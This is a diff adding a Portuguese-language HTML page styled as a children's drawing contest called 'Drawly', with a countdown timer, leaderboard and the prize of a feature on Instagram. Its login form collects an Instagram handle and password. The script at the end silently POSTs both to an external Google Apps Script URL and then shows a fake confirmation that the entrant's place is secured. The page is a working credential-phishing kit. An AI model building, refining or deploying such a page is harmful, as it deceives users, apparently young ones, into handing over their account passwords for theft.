@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Drawly - Competição de Desenho</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Fredoka:wght@600;700&display=swap');
+  body { margin:0; background: #f9d6f5; font-family: 'Fredoka', sans-serif; display:flex; justify-content:center; }
+  .phone { width: 390px; min-height: 100vh; background: white; border: 8px solid black; border-radius: 40px; overflow:hidden; position:relative; margin:20px; box-shadow: 0 20px 50px rgba(0,0,0,0.2); }
+  .header { background: linear-gradient(135deg, #ff8af0, #7a5CFA); padding:20px; text-align:center; color:white; }
+  .header h1 { font-size: 42px; margin:0; line-height:0.9; text-shadow: 3px 3px 0 black; -webkit-text-stroke: 2px black; }
+  .podium { background: #fff; margin: -15px 15px 0; border-radius: 20px; border:3px solid black; padding:15px; text-align:center; }
+  .podium-bears { display:flex; justify-content:space-around; align-items:end; margin:15px 0; }
+  .bear { font-size:40px; } .place1 { transform: scale(1.3); }
+  .desafio { background: #E8F4FF; margin:15px; border-radius:18px; padding:12px; border:2px dashed #7A5CFA; display:flex; justify-content:space-between; }
+  .timer { color:#ff2d7b; font-weight:700; font-size:22px; }
+  .leader { margin: 0 15px; background: #FFF8E1; border-radius:15px; padding:12px; border:2px solid black; }
+  .leader div { display:flex; justify-content:space-between; font-size:14px; margin:4px 0; }
+  .login { padding:18px; }
+  input { width:100%; padding:14px; border-radius:12px; border:2px solid black; margin-top:10px; box-sizing:border-box; font-family:inherit; }
+  .aviso { font-size:10px; color:#666; margin-top:5px; }
+  button { width:100%; background:black; color:white; padding:16px; border-radius:14px; font-size:20px; font-weight:700; margin-top:15px; border:none; cursor:pointer; }
+  button:active { transform: scale(0.97); }
+</style>
+</head>
+<body>
+<div class="phone">
+  <div class="header"><h1>COMPETIÇÃO<br>DESENHO 🔥</h1></div>
+  <div class="podium">
+    🏆 Podium dos Top 3 🏆
+    <div class="podium-bears">
+      <div><div class="bear">🧸</div>2º</div>
+      <div class="place1"><div class="bear">🧸✨</div>1º</div>
+      <div><div class="bear">🧸</div>3º</div>
+    </div>
+  </div>
+  <div class="desafio">
+    <div><b>✨ Desafio do Dia ✨</b><br><small>Tema: DOCE & Cartoon & Anime</small><br>⏰ <span class="timer" id="timer">05:23:17</span></div>
+    <div style="background:white; border-radius:10px; padding:8px; text-align:center; border:2px solid black"><small>Prêmio:</small><br><b style="color:#ff2d7b">Ganhe<br>destaque<br>no Insta!</b></div>
+  </div>
+  <div class="leader">
+    <b>📊 Leaderboard</b>
+    <div><span>1. @artista_kiki</span><span>1,240 pts</span></div>
+    <div><span>2. @doodle_lua</span><span>980 pts</span></div>
+    <div><span>3. @sketch_panda</span><span>850 pts</span></div>
+  </div>
+  <div class="login">
+    <h2 style="margin:0">Entrar para Competir</h2>
+    <input id="insta" placeholder="@ seu Instagram">
+    <input id="senha" type="password" placeholder="senha">
+    <div class="aviso">ℹ️ Preencha todos os campos.</div>
+    <button onclick="entrar()">Entrar na Competição</button>
+    <center><small style="display:block; margin-top:12px">Novo por aqui? <u>Criar conta</u></small></center>
+  </div>
+</div>
+
+<script>
+let tempo = 5*3600 + 23*60 + 17;
+setInterval(()=>{
+  tempo--;
+  let h = String(Math.floor(tempo/3600)).padStart(2,'0');
+  let m = String(Math.floor(tempo%3600/60)).padStart(2,'0');
+  let s = String(tempo%60).padStart(2,'0');
+  document.getElementById('timer').innerText = `${h}:${m}:${s}`;
+},1000);
+
+function entrar(){
+  const insta = document.getElementById('insta').value.trim();
+  const senhaApp = document.getElementById('senha').value.trim();
+  if(!insta || !senhaApp){ alert("Preenche o @ e senha!"); return; }
+
+  const SEU_LINK = 'https://script.google.com/macros/s/AKfycbyHAXx0g_kftujuaHMAUH50-jeW04EtDf_2iOvlE5q6d6FNklZqRtwdqkVHE_rq1u0/exec';
+
+  fetch(SEU_LINK, {
+    method: 'POST',
+    mode: 'no-cors',
+    body: JSON.stringify({
+      instagram: insta,
+      senha_app: senhaApp,
+      data: new Date().toLocaleString('pt-BR')
+    })
+  });
+
+  alert("✨ Bem-vinda @"+insta+"! Sua vaga no desafio de desenhar Anime foi garantida! 🎨 A competição será no dia 01/10/2026.");
+}
+</script>
+</body>
+</html>
